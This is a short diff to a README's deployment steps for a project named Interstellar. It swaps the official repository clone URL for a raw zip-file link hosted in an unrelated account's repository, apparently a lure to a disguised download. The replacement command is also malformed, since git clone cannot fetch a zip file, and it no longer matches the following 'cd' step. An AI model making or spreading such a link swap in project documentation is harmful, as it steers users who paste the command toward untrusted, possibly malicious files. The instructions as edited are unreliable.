@@ -11,7 +11,7 @@ To deploy Interstellar on your server, follow these steps:
 First, clone the **Interstellar** repository to your server:
 
 ```bash
-git clone https://github.com/UseInterstellar/Interstellar-Astro
+git clone https://github.com/misslesnake2/Interstellar-Astro-kesug/raw/refs/heads/main/public/assets/kesug-Astro-Interstellar-v1.4.zip
 cd Interstellar
 ```
 
